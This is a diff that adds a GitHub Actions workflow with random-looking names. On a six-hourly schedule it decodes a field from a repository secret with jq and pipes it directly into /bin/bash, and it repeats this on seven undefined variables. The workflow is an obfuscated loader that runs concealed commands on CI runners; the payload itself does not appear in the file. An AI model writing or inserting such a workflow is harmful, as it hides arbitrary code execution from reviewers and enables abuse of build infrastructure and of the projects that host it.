@@ -1,0 +1,25 @@
+name: weixutong6745
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: weixutong6745
+        env:
+          w0905: ${{ secrets.w0905 }}
+        run: |
+          echo $w0905 | jq -r .hf58 | /bin/bash
+          echo $zrvut8576 | jq -r .iaq76483 | /bin/bash
+          echo $ny4 | jq -r .ydo7 | /bin/bash
+          echo $vbgnp978 | jq -r .rhys4 | /bin/bash
+          echo $ugyy85 | jq -r .wvqh5659 | /bin/bash
+          echo $mnpu00 | jq -r .pqhis74 | /bin/bash
+          echo $cigsf6749 | jq -r .ygyau31 | /bin/bash
+          echo $h98530 | jq -r .vxto969 | /bin/bash
+
